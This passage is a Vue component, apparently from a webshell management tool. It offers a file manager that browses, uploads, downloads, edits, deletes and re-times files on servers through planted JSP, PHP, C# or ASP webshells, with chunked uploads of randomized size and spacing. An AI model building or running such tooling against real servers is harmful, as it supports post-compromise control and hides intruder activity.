<template>
  <div class="file-manager-panel">
    <div class="file-manager-container">
      <!-- 左侧目录树区域 (L1) -->
      <div class="directory-tree-panel">
        <div class="tree-header">
          <span class="tree-title">目录结构</span>
          <el-button
            type="primary"
            size="small"
            @click="refreshDirectoryTree"
            :loading="treeLoading"
          >
            <el-icon><Refresh /></el-icon>
          </el-button>
        </div>
        <div class="tree-content">
          <el-tree
            ref="directoryTree"
            :data="directoryTreeData"
            :props="treeProps"
            node-key="fullPath"
            @node-click="handleTreeNodeClick"
            :expand-on-click-node="false"
            :highlight-current="true"
            :default-expanded-keys="defaultExpandedKeys"
            class="directory-tree"
          >
            <template #default="{ node, data }">
              <div class="tree-node">
                <el-icon class="tree-node-icon">
                  <Folder v-if="data.isDirectory" />
                  <Document v-else />
                </el-icon>
                <span class="tree-node-label">{{ node.label }}</span>
              </div>
            </template>
          </el-tree>
        </div>
      </div>

      <!-- 右侧区域 -->
      <div class="file-content-panel">
        <!-- 当前路径区域 (R1) -->
        <div class="path-panel">
          <div class="path-header">
            <span class="path-title">当前路径:</span>
            <el-button
              type="text"
              size="small"
              @click="navigateToParent"
              :disabled="!canNavigateUp"
            >
              <el-icon><ArrowUp /></el-icon>
              上级目录
            </el-button>
          </div>
          <div class="path-input-container">
            <el-input
              v-model="currentPath"
              placeholder="输入路径或点击左侧目录树选择"
              @keyup.enter="navigateToPath"
              class="path-input"
            >
              <template #prepend>
                <el-icon><FolderOpened /></el-icon>
              </template>
              <template #append>
                <el-button @click="navigateToPath" type="primary">
                  <el-icon><Right /></el-icon>
                </el-button>
              </template>
            </el-input>
          </div>
        </div>

        <!-- 文件列表区域 (R2) -->
        <div class="file-list-panel">
          <div class="file-list-header">
            <span class="file-count">{{ fileList.length }} 个项目</span>
            <div class="list-actions">
              <el-button-group>
                <el-button
                  size="small"
                  :type="listViewMode === 'table' ? 'primary' : ''"
                  @click="listViewMode = 'table'"
                >
                  <el-icon><List /></el-icon>
                  列表
                </el-button>
                <el-button
                  size="small"
                  :type="listViewMode === 'grid' ? 'primary' : ''"
                  @click="listViewMode = 'grid'"
                >
                  <el-icon><Grid /></el-icon>
                  网格
                </el-button>
              </el-button-group>
              <el-button size="small" @click="refreshFileList" :loading="fileListLoading">
                <el-icon><Refresh /></el-icon>
                刷新
              </el-button>
            </div>
          </div>

          <!-- 表格视图 -->
          <div v-if="listViewMode === 'table'" class="file-table-container">
            <el-table
              :data="fileList"
              v-loading="fileListLoading"
              @selection-change="handleFileSelection"
              @row-dblclick="handleFileDoubleClick"
              :max-height="300"
              style="width: 100%"
              border
            >
              <el-table-column type="selection" width="55" />
              <el-table-column label="图标" width="60">
                <template #default="{ row }">
                  <el-icon class="file-icon" :class="getFileIconClass(row)">
                    <Folder v-if="row.isDirectory" />
                    <Document v-else-if="isTextFile(row.name)" />
                    <Picture v-else-if="isImageFile(row.name)" />
                    <VideoPlay v-else-if="isVideoFile(row.name)" />
                    <Files v-else />
                  </el-icon>
                </template>
              </el-table-column>
              <el-table-column label="文件名" prop="name" min-width="200" sortable>
                <template #default="{ row }">
                  <span
                    class="file-name"
                    :class="{ 'is-directory': row.isDirectory }"
                    @click="handleFileClick(row)"
                  >
                    {{ row.name }}
                  </span>
                </template>
              </el-table-column>
              <el-table-column label="最近修改时间" prop="lastModified" width="180" sortable>
                <template #default="{ row }">
                  {{ formatFileTime(row.lastModified) }}
                </template>
              </el-table-column>
              <el-table-column label="大小" prop="size" width="120" sortable>
                <template #default="{ row }">
                  {{ row.isDirectory ? '-' : formatFileSize(row.size) }}
                </template>
              </el-table-column>
              <el-table-column label="权限" prop="permission" width="120" sortable>
                <template #default="{ row }">
                  <el-tag size="small" :type="getPermissionTagType(row.permission)">
                    {{ row.permission || '-' }}
                  </el-tag>
                </template>
              </el-table-column>
              <el-table-column label="操作" width="160">
                <template #default="{ row }">
                  <el-button-group>
                    <el-button
                      size="small"
                      type="primary"
                      @click="handleFileAction('edit', row)"
                      v-if="!row.isDirectory && isTextFile(row.name) && row.size <= 1024 * 1024"
                    >
                      <el-icon><Edit /></el-icon>
                    </el-button>
                    <el-button
                      size="small"
                      type="success"
                      @click="handleFileAction('download', row)"
                      v-if="!row.isDirectory"
                    >
                      <el-icon><Download /></el-icon>
                    </el-button>
                    <el-button size="small" type="danger" @click="handleFileAction('delete', row)">
                      <el-icon><Delete /></el-icon>
                    </el-button>
                  </el-button-group>
                </template>
              </el-table-column>
            </el-table>
          </div>

          <!-- 网格视图 -->
          <div v-else class="file-grid-container">
            <div class="file-grid" v-loading="fileListLoading">
              <div
                v-for="file in fileList"
                :key="file.name"
                class="file-grid-item"
                :class="{ 'is-selected': selectedFiles.includes(file) }"
                @click="handleFileGridClick(file)"
                @dblclick="handleFileDoubleClick(file)"
              >
                <div class="file-grid-icon">
                  <el-icon :class="getFileIconClass(file)">
                    <Folder v-if="file.isDirectory" />
                    <Document v-else-if="isTextFile(file.name)" />
                    <Picture v-else-if="isImageFile(file.name)" />
                    <VideoPlay v-else-if="isVideoFile(file.name)" />
                    <Files v-else />
                  </el-icon>
                </div>
                <div class="file-grid-name">{{ file.name }}</div>
                <div class="file-grid-info">
                  <span class="file-size">{{
                    file.isDirectory ? '目录' : formatFileSize(file.size)
                  }}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        <!-- 功能按钮区域 (R3) -->
        <div class="action-buttons-panel">
          <div class="action-buttons">
            <el-button-group>
              <el-button type="primary" @click="handleAction('upload')">
                <el-icon><Upload /></el-icon>
                上传文件
              </el-button>
              <el-button
                type="primary"
                @click="handleAction('download')"
                :disabled="selectedFiles.length === 0 || hasDirectorySelected"
              >
                <el-icon><Download /></el-icon>
                下载文件
              </el-button>
              <el-button type="primary" @click="handleAction('fileRemoteDownload')">
                <el-icon><Download /></el-icon>
                远程下载文件
              </el-button>
            </el-button-group>

            <el-button-group>
              <el-button
                type="info"
                @click="handleAction('move')"
                :disabled="selectedFiles.length === 0"
              >
                <el-icon><Rank /></el-icon>
                移动
              </el-button>
              <el-button
                type="info"
                @click="handleAction('copy')"
                :disabled="selectedFiles.length === 0"
              >
                <el-icon><CopyDocument /></el-icon>
                复制
              </el-button>
              <el-button
                type="danger"
                @click="handleAction('delete')"
                :disabled="selectedFiles.length === 0"
              >
                <el-icon><Delete /></el-icon>
                删除
              </el-button>
            </el-button-group>
            <el-button-group>
              <el-button type="success" @click="handleAction('newItem')">
                <el-icon><DocumentAdd /></el-icon>
                新建文件或目录
              </el-button>
              <el-button type="success" @click="handleAction('zip')">
                <el-icon><DocumentAdd /></el-icon>
                压缩文件
              </el-button>
              <el-button type="success" @click="handleAction('unzip')">
                <el-icon><DocumentAdd /></el-icon>
                解压文件
              </el-button>
            </el-button-group>
            <el-button-group>
              <el-button type="success" @click="handleAction('setFileTime')">
                <el-icon><Edit /></el-icon>
                修改文件时间属性
              </el-button>
              <el-button type="success" @click="handleAction('setFilePermission')">
                <el-icon><Edit /></el-icon>
                修改文件权限属性
              </el-button>
              <!-- 编辑文件内容-->
              <el-button
                type="success"
                @click="handleAction('editFileContent')"
                :disabled="
                  selectedFiles.length !== 1 ||
                  selectedFiles[0]?.isDirectory ||
                  selectedFiles[0]?.size > 1024 * 1024
                "
              >
                <el-icon><Edit /></el-icon>
                编辑文件内容
              </el-button>
            </el-button-group>
          </div>
        </div>
      </div>
    </div>

    <!-- 下载状态对话框 -->
    <el-dialog
      v-model="downloadProgressVisible"
      title="文件下载"
      width="400px"
      :close-on-click-modal="false"
      :close-on-press-escape="false"
      :show-close="false"
    >
      <div class="download-status-content">
        <div class="loading-animation">
          <el-icon class="is-loading">
            <Loading />
          </el-icon>
        </div>
        <div class="status-info">
          <div class="status-text">{{ downloadStatus.status }}</div>
          <div class="file-info">
            <span class="current-file">{{ downloadStatus.currentFile }}</span>
          </div>
          <div class="progress-stats">
            {{ downloadStatus.currentIndex }} / {{ downloadStatus.totalFiles }}
          </div>
        </div>
      </div>
      <template #footer>
        <el-button type="primary" @click="cancelDownload">取消下载</el-button>
      </template>
    </el-dialog>

    <!-- 上传状态对话框 -->
    <el-dialog
      v-model="uploadProgressVisible"
      title="文件上传"
      width="450px"
      :close-on-click-modal="false"
      :close-on-press-escape="false"
      :show-close="false"
    >
      <div class="upload-status-content">
        <div class="status-info">
          <div class="status-text">{{ uploadStatus.status }}</div>
          <div class="file-info">
            <span class="current-file">{{ uploadStatus.fileName }}</span>
          </div>
          <div class="progress-container">
            <el-progress
              :percentage="uploadStatus.percentage"
              :stroke-width="8"
              status="success"
              :format="formatUploadProgress"
            />
          </div>
          <div class="progress-details">
            <div class="chunk-progress">
              块进度: {{ uploadStatus.currentChunk }} / {{ uploadStatus.totalChunks }}
            </div>
            <div class="byte-progress">
              已上传: {{ formatFileSize(uploadStatus.uploadedBytes) }} /
              {{ formatFileSize(uploadStatus.totalBytes) }}
            </div>
          </div>
        </div>
      </div>
      <template #footer>
        <el-button type="primary" @click="cancelUpload">取消上传</el-button>
      </template>
    </el-dialog>

    <!-- 文件编辑器对话框 -->
    <el-dialog
      v-model="fileEditorVisible"
      :title="'编辑文件: ' + fileEditorFileName"
      width="70%"
      :close-on-click-modal="false"
      class="file-edit-dialog-container"
      :before-close="handleEditorClose"
    >
      <div class="file-editor-container">
        <div
          class="editor-header"
          style="margin-bottom: 10px; display: flex; justify-content: space-between"
        >
          <span class="file-path" style="font-size: 12px; color: #909399"
            >文件路径: {{ fileEditorPath }}</span
          >
        </div>
        <el-input
          v-model="fileEditorContent"
          type="textarea"
          :rows="20"
          placeholder="文件内容将在这里显示..."
          resize="vertical"
          class="editor-textarea"
          spellcheck="false"
          style="font-family: 'Courier New', monospace"
          @keydown.ctrl.s.prevent="saveFileContent"
        />
        <div
          class="editor-footer-info"
          style="
            font-size: 12px;
            color: #909399;
            margin-top: 8px;
            display: flex;
            justify-content: space-between;
          "
        >
          <div class="shortcuts-info">
            <span>💡 提示：Ctrl+S 保存</span>
          </div>
          <div class="char-count">字符数: {{ fileEditorContent.length }}</div>
        </div>
      </div>
      <template #footer>
        <span class="dialog-footer">
          <el-button @click="handleEditorClose">取消</el-button>
          <el-button type="primary" @click="saveFileContent" :loading="fileEditorSaving">
            保存文件
          </el-button>
        </span>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, watch } from 'vue'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  Refresh,
  Folder,
  Document,
  ArrowUp,
  FolderOpened,
  Right,
  List,
  Grid,
  Picture,
  VideoPlay,
  Files,
  Edit,
  Download,
  Upload,
  Delete,
  DocumentAdd,
  Rank,
  CopyDocument,
  Loading,
} from '@element-plus/icons-vue'
import { javaShellApi, phpShellApi, csharpShellApi, aspShellApi } from '@/api/api'
import { computed } from 'vue'

// 定义props
const props = defineProps({
  currentWebshell: {
    type: Object,
    default: null,
  },
  systemInfo: {
    type: Object,
    default: null,
  },
  currentDirectory: {
    type: String,
    default: '',
  },
  visible: {
    type: Boolean,
    default: false,
  },
})

// 根据 webshell 类型选择对应的 API
const shellApi = computed(() => {
  if (!props.currentWebshell) return javaShellApi

  const webshellType = props.currentWebshell.webshellType?.toLowerCase() || 'jsp'
  console.log('[DEBUG] 当前 webshell 类型:', webshellType)

  if (webshellType === 'php') {
    return phpShellApi
  }

  if (webshellType === 'csharp') {
    return csharpShellApi
  }

  if (webshellType === 'asp') {
    return aspShellApi
  }

  return javaShellApi
})

// 定义emits
const emit = defineEmits(['directory-changed'])

// 文件管理相关数据状态
const directoryTreeData = ref([])
const directoryTree = ref(null)
const treeLoading = ref(false)
const defaultExpandedKeys = ref([])
const treeProps = {
  children: 'children',
  label: 'name',
}

// 文件列表相关
const fileList = ref([])
const fileListLoading = ref(false)
const selectedFiles = ref([])
const currentPath = ref('')
const listViewMode = ref('table') // 'table' 或 'grid'

// 文件操作相关
const canNavigateUp = ref(false)
const hasDirectorySelected = ref(false)

// 下载状态相关
const downloadProgressVisible = ref(false)
const downloadStatus = ref({
  currentFile: '',
  totalFiles: 0,
  currentIndex: 0,
  status: '准备下载...',
})
let downloadCancelled = false

// 上传状态相关
const uploadProgressVisible = ref(false)
const uploadStatus = ref({
  fileName: '',
  currentChunk: 0,
  totalChunks: 0,
  uploadedBytes: 0,
  totalBytes: 0,
  status: '准备上传...',
  percentage: 0,
})
let uploadCancelled = false

// 文件编辑器相关状态
const fileEditorVisible = ref(false)
const fileEditorContent = ref('')
const fileEditorPath = ref('')
const fileEditorFileName = ref('')
const fileEditorInitialContent = ref('')
const fileEditorSaving = ref(false)

// 取消下载
const cancelDownload = () => {
  downloadCancelled = true
  downloadProgressVisible.value = false
  ElMessage.warning('下载已取消')
}

// 取消上传
const cancelUpload = () => {
  uploadCancelled = true
  uploadProgressVisible.value = false
  ElMessage.warning('上传已取消')
}

// 更新下载状态
const updateDownloadStatus = (currentIndex, totalFiles, fileName, status = '') => {
  downloadStatus.value = {
    currentFile: fileName,
    totalFiles: totalFiles,
    currentIndex: currentIndex,
    status: status || `正在下载 ${currentIndex}/${totalFiles}: ${fileName}`,
  }
}

// 更新上传状态
const updateUploadStatus = (
  currentChunk,
  totalChunks,
  uploadedBytes,
  totalBytes,
  fileName,
  status = '',
) => {
  const percentage = totalBytes > 0 ? Math.round((uploadedBytes / totalBytes) * 100) : 0

  uploadStatus.value = {
    fileName: fileName,
    currentChunk: currentChunk,
    totalChunks: totalChunks,
    uploadedBytes: uploadedBytes,
    totalBytes: totalBytes,
    status: status || `正在上传: ${fileName}`,
    percentage: percentage,
  }
}

// 格式化上传进度
const formatUploadProgress = (percentage) => {
  return `${percentage}%`
}

// 判断是否为Windows系统
const isWindowsSystem = () => {
  if (!props.systemInfo) return false
  const detectedType = props.systemInfo.DetectedSystemType
  if (detectedType) {
    return detectedType.toLowerCase() === 'windows'
  }
  return false
}

// 统一Windows路径分隔符，避免混合斜杠
const normalizeWindowsPath = (path) => {
  if (!path) return path
  let normalized = path.replace(/\//g, '\\')
  normalized = normalized.replace(/\\{2,}/g, '\\')
  if (/^[A-Za-z]:$/.test(normalized)) {
    normalized += '\\'
  }
  return normalized
}

// 监听currentDirectory变化
watch(
  () => props.currentDirectory,
  (newDir) => {
    console.log('监听到currentDirectory变化:', newDir)
    if (newDir && newDir !== currentPath.value) {
      currentPath.value = isWindowsSystem() ? normalizeWindowsPath(newDir) : newDir
    }
  },
  { immediate: true },
)

// 监听visible变化
watch(
  () => props.visible,
  (newValue) => {
    console.log('监听到visible变化:', newValue)
    if (newValue && props.currentWebshell) {
      initializeFileManager()
    }
  },
)

// 初始化文件管理数据
const initializeFileManager = () => {
  if (!props.currentWebshell) return

  console.log('初始化文件管理器')

  // 获取当前目录
  const currentDir = props.currentDirectory || (isWindowsSystem() ? 'C:\\' : '/')
  const normalizedDir = isWindowsSystem() ? normalizeWindowsPath(currentDir) : currentDir
  currentPath.value = normalizedDir

  // 初始化目录树，从根目录开始构建并展开到当前路径
  initializeDirectoryTree()

  // 加载文件列表
  loadFileList(normalizedDir)
}

// 初始化目录树
const initializeDirectoryTree = () => {
  const currentDir = props.currentDirectory || (isWindowsSystem() ? 'C:\\' : '/')
  const normalizedDir = isWindowsSystem() ? normalizeWindowsPath(currentDir) : currentDir

  // 构建从根目录到当前目录的路径树
  buildPathTreeToCurrentDirectory(normalizedDir)

  // 注意：不再需要展开当前目录层级，因为会在loadFileList中更新
}

// 构建从根目录到当前目录的路径树
const buildPathTreeToCurrentDirectory = (currentDir) => {
  if (isWindowsSystem()) {
    // Windows系统路径处理
    const normalizedDir = normalizeWindowsPath(currentDir)
    const pathParts = normalizedDir.split('\\').filter((part) => part)
    const driveLetter = pathParts[0] || 'C:'

    // 构建根节点（盘符）
    const rootNode = {
      name: driveLetter,
      fullPath: driveLetter + '\\',
      isDirectory: true,
      children: [],
      childrenLoaded: false,
    }

    // 构建路径树
    let currentNode = rootNode
    let currentPath = driveLetter

    for (let i = 1; i < pathParts.length; i++) {
      const part = pathParts[i]
      currentPath += '\\' + part

      const childNode = {
        name: part,
        fullPath: currentPath + '\\',
        isDirectory: true,
        children: [],
        childrenLoaded: false,
      }

      currentNode.children = [childNode] // 只添加当前路径的子节点
      currentNode = childNode
    }

    directoryTreeData.value = [rootNode]

    // 设置展开的键
    const expandedKeys = [driveLetter + '\\']
    let keyPath = driveLetter
    for (let i = 1; i < pathParts.length; i++) {
      keyPath += '\\' + pathParts[i]
      expandedKeys.push(keyPath + '\\')
    }
    defaultExpandedKeys.value = expandedKeys
  } else {
    // Linux系统路径处理
    const pathParts = currentDir.split('/').filter((part) => part)

    // 构建根节点
    const rootNode = {
      name: '根目录',
      fullPath: '/',
      isDirectory: true,
      children: [],
      childrenLoaded: false,
    }

    // 构建路径树
    let currentNode = rootNode
    let currentPath = ''

    for (const part of pathParts) {
      currentPath += '/' + part

      const childNode = {
        name: part,
        fullPath: currentPath + '/',
        isDirectory: true,
        children: [],
        childrenLoaded: false,
      }

      currentNode.children = [childNode] // 只添加当前路径的子节点
      currentNode = childNode
    }

    directoryTreeData.value = [rootNode]

    // 设置展开的键
    const expandedKeys = ['/']
    let keyPath = ''
    for (const part of pathParts) {
      keyPath += '/' + part
      expandedKeys.push(keyPath + '/')
    }
    defaultExpandedKeys.value = expandedKeys
  }
}

// 在目录树中查找指定路径的节点
const findNodeByPath = (nodes, targetPath) => {
  for (const node of nodes) {
    if (node.fullPath === targetPath) {
      return node
    }
    if (node.children && node.children.length > 0) {
      const found = findNodeByPath(node.children, targetPath)
      if (found) return found
    }
  }
  return null
}

// 使用目录信息更新目录树
const updateDirectoryTreeWithDirectories = (targetPath, directories) => {
  if (!targetPath) return

  console.log(`[DEBUG] 使用目录信息更新目录树: ${targetPath}，子目录数量: ${directories.length}`)

  // 检查目标路径是否在当前目录树中
  const targetNode = findNodeByPath(directoryTreeData.value, targetPath)

  if (!targetNode) {
    // 如果目标路径不在当前树中，重新构建路径树
    console.log(`[DEBUG] 目标路径不在当前树中，重新构建路径树`)
    buildPathTreeToCurrentDirectory(targetPath)

    // 异步更新子目录
    setTimeout(() => {
      const newTargetNode = findNodeByPath(directoryTreeData.value, targetPath)
      if (newTargetNode) {
        updateNodeChildren(newTargetNode, targetPath, directories)
      }
    }, 100)
  } else {
    // 如果目标路径在当前树中，直接更新子目录
    console.log(`[DEBUG] 目标路径在当前树中，直接更新子目录`)
    updateNodeChildren(targetNode, targetPath, directories)

    // 设置选中状态
    setTimeout(() => {
      if (directoryTree.value) {
        directoryTree.value.setCurrentKey(targetPath)
      }
    }, 100)
  }
}

// 更新节点的子目录
const updateNodeChildren = (targetNode, targetPath, directories) => {
  if (!targetNode) return

  // 构建子目录节点
  const childNodes = directories.map((dir) => ({
    name: dir.name,
    fullPath: isWindowsSystem()
      ? targetPath + (targetPath.endsWith('\\') ? '' : '\\') + dir.name + '\\'
      : targetPath + (targetPath.endsWith('/') ? '' : '/') + dir.name + '/',
    isDirectory: true,
    children: [],
    childrenLoaded: false,
  }))

  // 更新节点的子目录
  targetNode.children = childNodes
  targetNode.childrenLoaded = true

  console.log(`[DEBUG] 成功更新目录树节点，加载了 ${childNodes.length} 个子目录`)

  // 强制更新视图
  directoryTreeData.value = [...directoryTreeData.value]
}

// 刷新目录树
const refreshDirectoryTree = () => {
  treeLoading.value = true
  initializeDirectoryTree()
  setTimeout(() => {
    treeLoading.value = false
  }, 1000)
}

// 处理目录树节点点击
const handleTreeNodeClick = async (data) => {
  if (data.isDirectory) {
    console.log(`[DEBUG] 目录树节点点击: ${data.fullPath}`)
    currentPath.value = data.fullPath

    // 加载该目录的文件列表（loadFileList内部会处理目录树同步）
    loadFileList(data.fullPath)
  }
}

// 导航到上级目录
const navigateToParent = () => {
  if (!canNavigateUp.value) return

  const path = currentPath.value
  let parentPath = ''

  if (isWindowsSystem()) {
    const parts = path.split('\\').filter((p) => p)
    if (parts.length > 1) {
      parentPath = parts.slice(0, -1).join('\\') + '\\'
    } else {
      parentPath = parts[0] + '\\'
    }
  } else {
    const parts = path.split('/').filter((p) => p)
    if (parts.length > 1) {
      parentPath = '/' + parts.slice(0, -1).join('/')
    } else {
      parentPath = '/'
    }
  }

  loadFileList(parentPath)
}

// 导航到指定路径
const navigateToPath = () => {
  if (!currentPath.value.trim()) return
  loadFileList(currentPath.value)
}

// 加载指定路径的文件列表
const loadFileList = async (path) => {
  if (!props.currentWebshell) {
    ElMessage.warning('请先选择webshell')
    return
  }

  if (!path) {
    path = currentPath.value
  }
  if (isWindowsSystem()) {
    path = normalizeWindowsPath(path)
  }

  fileListLoading.value = true

  try {
    const response = await shellApi.value.getFiles({
      webshell_id: props.currentWebshell.id,
      path: path,
    })

    if (response.data.status === 'success') {
      const files = response.data.data.files || []

      // 添加上级目录项(..)，除非是根目录
      if (path !== '/' && !path.match(/^[A-Za-z]:$/)) {
        files.unshift({
          name: '..',
          isDirectory: true,
          lastModified: new Date().toISOString(),
          size: 0,
          permission: 'drwxr-xr-x',
        })
      }

      // 更新文件列表
      fileList.value = files
      currentPath.value = path
      updateNavigationState()

      // 通知父组件目录变化
      emit('directory-changed', path)

      // 从文件列表中提取目录信息，用于更新左侧目录树
      const directories = files.filter((file) => file.isDirectory && file.name !== '..')
      updateDirectoryTreeWithDirectories(path, directories)

      console.log(`成功获取文件列表: ${files.length} 个项目`)
    } else {
      ElMessage.error(response.data.message || '获取文件列表失败')
      fileList.value = []
    }
  } catch (error) {
    console.error('获取文件列表失败:', error)
    ElMessage.error('获取文件列表失败: ' + (error.response?.data?.message || error.message))
    fileList.value = []
  } finally {
    fileListLoading.value = false
  }
}

// 刷新文件列表
const refreshFileList = () => {
  loadFileList(currentPath.value)
}

// 更新导航状态
const updateNavigationState = () => {
  const path = currentPath.value
  const normalizedPath = isWindowsSystem() ? normalizeWindowsPath(path) : path
  canNavigateUp.value = normalizedPath !== '/' && normalizedPath !== 'C:\\'
}

// 处理文件选择
const handleFileSelection = (selection) => {
  selectedFiles.value = selection
  hasDirectorySelected.value = selection.some((file) => file.isDirectory)
}

// 处理文件双击
const handleFileDoubleClick = (file) => {
  if (file.isDirectory) {
    if (file.name === '..') {
      navigateToParent()
    } else {
      const newPath = isWindowsSystem()
        ? normalizeWindowsPath(currentPath.value) +
          (normalizeWindowsPath(currentPath.value).endsWith('\\') ? '' : '\\') +
          file.name
        : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + file.name
      loadFileList(newPath)
    }
  } else {
    // 处理文件双击（如预览、编辑等）
    handleFileAction('edit', file)
  }
}

// 处理文件点击
const handleFileClick = (file) => {
  // 单击文件的处理逻辑
  console.log('点击文件:', file.name)
}

// 处理网格视图文件点击
const handleFileGridClick = (file) => {
  const index = selectedFiles.value.findIndex((f) => f.name === file.name)
  if (index > -1) {
    selectedFiles.value.splice(index, 1)
  } else {
    selectedFiles.value.push(file)
  }
  hasDirectorySelected.value = selectedFiles.value.some((f) => f.isDirectory)
}

// 处理单个文件操作
const handleFileAction = (action, file) => {
  switch (action) {
    case 'edit':
      // 检查文件是否可编辑
      if (file.isDirectory) {
        ElMessage.error('不能编辑目录，请选择文件')
        return
      }
      if (file.size > 1024 * 1024) {
        ElMessage.error(`文件大小超过1MB限制，当前文件大小：${formatFileSize(file.size)}`)
        return
      }
      // 设置选中文件为当前文件，然后调用编辑函数
      selectedFiles.value = [file]
      handleEditFileContent()
      break
    case 'download':
      // 设置选中文件为当前文件，然后调用下载函数
      selectedFiles.value = [file]
      handleDownloadFiles()
      break
    case 'delete':
      // 设置选中文件为当前文件，然后调用删除函数
      selectedFiles.value = [file]
      handleDeleteFiles()
      break
  }
}

// 处理文件上传
const handleFileUpload = () => {
  // 创建隐藏的文件输入元素
  const fileInput = document.createElement('input')
  fileInput.type = 'file'
  fileInput.multiple = false
  fileInput.accept = '*/*'

  // 处理文件选择
  fileInput.onchange = async (event) => {
    const file = event.target.files[0]
    if (!file) return

    // 显示文件名输入对话框
    try {
      const fileName = await ElMessageBox.prompt('请输入文件名（可修改）:', '文件上传', {
        confirmButtonText: '下一步',
        cancelButtonText: '取消',
        inputValue: file.name,
        inputPattern: /^.+$/,
        inputErrorMessage: '文件名不能为空',
      })

      if (fileName.value) {
        // 显示上传方式选择对话框
        const uploadConfig = await showUploadMethodDialog(file)
        if (uploadConfig) {
          await uploadFileToServer(file, fileName.value, uploadConfig)
        }
      }
    } catch {
      // 用户取消上传
      console.log('用户取消上传')
    }
  }

  // 触发文件选择
  fileInput.click()
}

// 上传文件到服务器
const uploadFileToServer = async (file, fileName, uploadConfig = { method: 'normal' }) => {
  if (!props.currentWebshell) {
    ElMessage.error('请先选择webshell')
    return
  }

  try {
    // 读取文件内容
    const fileContent = await readFileAsArrayBuffer(file)

    // 构造目标文件路径
    const targetPath = isWindowsSystem()
      ? currentPath.value + (currentPath.value.endsWith('\\') ? '' : '\\') + fileName
      : currentPath.value + (currentPath.value.endsWith('/') ? '' : '/') + fileName

    console.log(`[DEBUG] 上传文件: ${fileName}, 方式: ${uploadConfig.method}`)

    if (uploadConfig.method === 'big') {
      // 使用大文件上传模式
      uploadCancelled = false
      uploadProgressVisible.value = true

      const fileSize = fileContent.byteLength
      const baseMbSize = uploadConfig.chunkMbSize || 1
      const delaySeconds = uploadConfig.delaySeconds || 0.5
      const maxRetries = uploadConfig.maxRetries || 5
      const enableVariation = uploadConfig.enableChunkSizeVariation || false
      const variationMb = uploadConfig.chunkSizeVariationMb || 0.2

      // 计算预估的块数（用于进度显示）
      const baseChunkSize = baseMbSize * 1024 * 1024 // 转换为字节
      const estimatedTotalChunks = Math.ceil(fileSize / baseChunkSize)

      console.log(
        `[INFO] 文件大小: ${fileSize} 字节 (${formatFileSize(fileSize)})，预估分 ${estimatedTotalChunks} 个块上传`,
      )
      console.log(
        `[INFO] 块大小配置: 基础${baseMbSize}MB${enableVariation ? `，浮动范围±${variationMb}MB` : ''}`,
      )

      // 初始化上传状态
      updateUploadStatus(0, estimatedTotalChunks, 0, fileSize, fileName, '准备上传...')

      // 分块上传 - 使用动态块大小
      let currentPosition = 0
      let chunkIndex = 0

      while (currentPosition < fileSize) {
        // 检查是否取消上传
        if (uploadCancelled) {
          ElMessage.warning('上传已取消')
          return
        }

        chunkIndex++

        // 计算当前块的随机大小
        const currentChunkMbSize = calculateRandomChunkSize(
          baseMbSize,
          enableVariation,
          variationMb,
        )
        const currentChunkSize = Math.round(currentChunkMbSize * 1024 * 1024) // 转换为字节并四舍五入

        const start = currentPosition
        const end = Math.min(start + currentChunkSize, fileSize)
        const chunkData = fileContent.slice(start, end)
        const actualChunkSize = chunkData.byteLength

        console.log(
          `[INFO] 上传块 ${chunkIndex}: 位置 ${start} - ${end}, 计划大小 ${formatFileSize(currentChunkSize)}, 实际大小 ${formatFileSize(actualChunkSize)} (${currentChunkMbSize}MB)`,
        )
        console.log(
          `[DEBUG] 块大小浮动状态: 启用=${enableVariation}, 基础=${baseMbSize}MB, 浮动范围=±${variationMb}MB, 随机结果=${currentChunkMbSize}MB`,
        )

        // 更新上传状态 - 使用预估总块数
        updateUploadStatus(
          chunkIndex,
          estimatedTotalChunks,
          end,
          fileSize,
          fileName,
          `正在上传块 ${chunkIndex} (${currentChunkMbSize}MB)...`,
        )

        // 重试机制
        let success = false
        for (let retry = 0; retry < maxRetries; retry++) {
          if (uploadCancelled) break

          try {
            const response = await shellApi.value.uploadFile({
              webshell_id: props.currentWebshell.id,
              filePath: targetPath,
              fileData: Array.from(new Uint8Array(chunkData)),
              useBigUpload: true,
              chunkPosition: start, // 当前块在文件中的位置
              totalFileSize: fileSize, // 完整文件大小
              chunkMbSize: currentChunkMbSize, // 使用当前块的实际大小
              delaySeconds: delaySeconds,
              maxRetries: maxRetries,
            })

            if (response.data.status === 'success') {
              const responseData = response.data.data
              console.log(
                `[DEBUG] 块 ${chunkIndex} 上传成功 (位置: ${start}-${end}, 大小: ${formatFileSize(actualChunkSize)}, 进度: ${responseData.progress?.toFixed(1)}%)`,
              )
              success = true

              // 更新上传状态为当前完成的位置
              updateUploadStatus(
                chunkIndex,
                estimatedTotalChunks,
                end,
                fileSize,
                fileName,
                `块 ${chunkIndex} 上传完成 (${currentChunkMbSize}MB)`,
              )

              break
            } else {
              console.log(
                `[WARNING] 块 ${chunkIndex} 上传失败，重试 ${retry + 1}/${maxRetries}: ${response.data.message}`,
              )
            }
          } catch (chunkError) {
            console.error(`[ERROR] 块 ${chunkIndex} 上传异常: ${chunkError}`)
          }

          // 如果不是最后一次重试，等待一段时间
          if (retry < maxRetries - 1) {
            await new Promise((resolve) => setTimeout(resolve, delaySeconds * 1000))
          }
        }

        if (!success) {
          uploadProgressVisible.value = false
          ElMessage.error(`大文件上传失败：块 ${chunkIndex} 上传失败，已重试 ${maxRetries} 次`)
          console.log(
            `[ERROR] 文件上传中断: ${fileName}, 失败在块 ${chunkIndex} (位置: ${start}-${end}, 大小: ${formatFileSize(actualChunkSize)})`,
          )
          return
        }

        // 更新当前位置
        currentPosition = end

        // 成功上传一个块后，等待延迟时间（除了最后一个块）
        if (currentPosition < fileSize && delaySeconds > 0) {
          await new Promise((resolve) => setTimeout(resolve, delaySeconds * 1000))
        }
      }

      // 大文件上传完成
      uploadProgressVisible.value = false
      ElMessage.success(`大文件上传成功: ${fileName} (${formatFileSize(fileSize)})`)
      console.log(
        `[SUCCESS] 大文件上传完成: ${fileName}, 总大小: ${formatFileSize(fileSize)}, 共 ${chunkIndex} 个块${enableVariation ? ' (使用动态块大小)' : ''}`,
      )
    } else {
      // 使用普通上传模式
      const loadingMessage = ElMessage({
        message: '正在上传文件...',
        type: 'info',
        duration: 0,
      })

      const response = await shellApi.value.uploadFile({
        webshell_id: props.currentWebshell.id,
        filePath: targetPath,
        fileData: Array.from(new Uint8Array(fileContent)),
